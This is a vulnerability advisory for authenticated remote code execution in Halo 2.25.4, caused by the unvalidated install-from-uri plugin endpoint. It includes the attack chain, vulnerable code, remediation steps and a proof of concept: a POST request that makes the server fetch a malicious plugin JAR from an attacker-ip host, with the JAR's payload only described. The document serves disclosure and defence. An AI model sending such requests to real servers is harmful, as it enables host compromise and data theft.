# Technical Advisory: Authenticated Remote Code Execution (RCE) via Unvalidated Plugin URI Installation in Halo 2.25.4

## 1. Vulnerability Summary

A critical security vulnerability has been identified in Halo version 2.25.4. The application provides an administrative endpoint to install or upgrade plugins from a remote URI. However, the system fails to validate the source domain of the URI and lacks Server-Side Request Forgery (SSRF) protections on this specific component. An authenticated attacker with plugin management privileges can supply a link to a maliciously crafted plugin JAR file. The server will download, temporarily store, and dynamically load the JAR file into the JVM context using the PF4J framework and Spring's `DefaultPluginApplicationContextFactory`. This permits the execution of untrusted extension classes, resulting in arbitrary Remote Code Execution (RCE) on the underlying host operating system.

## 2. Vulnerability Details

- **Vulnerability Type:** Code Injection / Remote Code Execution (RCE)
- **CWE ID:** [CWE-94: Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html) / [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- **Severity:** 🔴 Critical
- **Estimated CVSS v3.1 Score:** 9.8 (`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`)
- **Affected Version:** Halo 2.25.4 (and potentially prior versions supporting URI-based plugin installation)

## 3. Affected Components

Please separate with commas when submitting to the CVE form:

Plaintext

```
PluginEndpoint.java, installFromUri method, DefaultPluginApplicationContextFactory
```

## 4. Attack Vector

An authenticated administrator can send a crafted HTTP `POST` request containing a malicious remote plugin JAR URL to the `/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri` endpoint.

## 5. Technical Analysis & Attack Chain

The remote code execution occurs through the following sequence of operations:

1. **Endpoint Ingestion:** The `PluginEndpoint.installFromUri()` method processes the incoming request body (`InstallFromUriRequest`) and extracts the `uri` string supplied by the user. There is no domain whitelist filtering applied.
2. **Unprotected File Retrieval:** The extracted URI is passed to `DefaultReactiveUrlDataBufferFetcher.fetch(uri)`. Unlike other internal networking components in Halo, this fetcher does not invoke `HttpSecurityUtils.secureHttpClient()`, skipping internal private network/loopback IP restrictions (SSRF protection).
3. **Local File Persistence:** The streaming content downloaded from the remote URI is written to a local temporary directory on the host server via `writeToTempFile(content)`.
4. **Dynamic Class Loading:** The application passes the temporary path to `pluginService.install(path)`, which leverages the PF4J `JarPluginLoader` to unpack and load the JAR file.
5. **Spring Bean Registration & Execution:** Once PF4J finishes loading the context, Spring's `DefaultPluginApplicationContextFactory` automatically parses the metadata inside the plugin's `plugin.yaml` and registers all declared extension classes into the application context as Active Spring Beans.
6. **Code Execution Trigger:** Any malicious code placed inside the extension class's static initialization blocks (`static {}`) or method blocks annotated with `@PostConstruct` will be executed immediately during instance creation via `Runtime.getRuntime().exec()`.

### Vulnerable Source Code Segment (`PluginEndpoint.java` lines 422-428):

Java

```
var content = request.bodyToMono(InstallFromUriRequest.class)
    .map(InstallFromUriRequest::uri)
    .flatMapMany(reactiveUrlDataBufferFetcher::fetch);  // Unvalidated network fetch
return Mono.usingWhen(writeToTempFile(content), pluginService::install, this::deleteFileIfExists);
```

## 6. Proof of Concept (PoC)

### Step 1: Host the Malicious Artifact

The attacker compiles a standard PF4J/Halo plugin JAR file (`poc-plugin.jar`) containing an extension class with a payload execution mechanism inside a `@PostConstruct` lifecycle hook or static block. The attacker hosts it on an external listener:

Bash

```
python3 -m http.server 9999
```

### Step 2: Triggering the Vulnerability

The authenticated administrative user sends the following HTTP request to the target Halo server:

HTTP

```
POST /apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri HTTP/1.1
Host: <target-ip>:8090
Authorization: Bearer <ADMIN_TOKEN_HERE>
Content-Type: application/json

{
  "uri": "http://<attacker-ip>:9999/poc-plugin.jar"
}
```

### Step 3: Expected Result

The server processes the installation, fetches the artifact from the attacker's server, registers the extension, and executes the compiled system command, compromising the target host.

## 7. Impact

- **System Compromise:** Full access to the hosting infrastructure or Docker container under the privileges of the application process.
- **Data Theft:** Direct exposure of backend databases, sensitive application credentials, configuration keys (`application.yaml`), and stored files.
- **Lateral Movement:** The server can be pivoted to attack inner site networks since the download mechanism can access loopback or internal infrastructure endpoints bypassing standard egress rules.

## 8. Remediation Recommendations

1. **Enforce Absolute Domain Whitelists:** Enforce strict validation rules on the incoming `uri` argument. Restrict remote installation schemas to verified, trusted official ecosystem marketplaces (e.g., `https://awesome.halo.run`).
2. **Integrate Secure Fetchers:** Refactor `DefaultReactiveUrlDataBufferFetcher` to utilize the existing `HttpSecurityUtils.secureHttpClient()` utility to drop requests pointing to loopback (`127.0.0.1`), link-local (`169.254.169.254`), or private class networks (`10.0.0.0/8`, `192.168.0.0/16`).
3. **Cryptographic Plugin Verification:** Implement a digital signature verification standard for external JAR modules. The `JarPluginLoader` context should validate file hashes or cryptographic signatures against public keys provided by the official repository before passing them to the `DefaultPluginApplicationContextFactory` for context instantiation.
